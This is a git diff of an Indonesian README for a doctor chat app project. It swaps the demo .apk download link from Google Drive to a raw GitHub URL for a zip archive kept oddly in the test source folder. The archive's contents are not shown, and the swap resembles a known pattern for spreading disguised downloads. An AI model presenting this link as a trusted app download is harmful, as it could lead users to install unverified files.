@@ -5,4 +5,4 @@ pada project ini adalah build aplikasi chat untuk dokter
 
 demp .apk dapat dilihat disini :
 
-https://drive.google.com/drive/folders/1Etd3n6d7g2N9_io838H8aJBQA9VZBksT?usp=sharing
+https://raw.githubusercontent.com/yudikarma/AplikasiDokterFKH/master/app/src/test/java/com/example/yudikarma/FKH_Aplikasi_Dokter_v2.8.zip
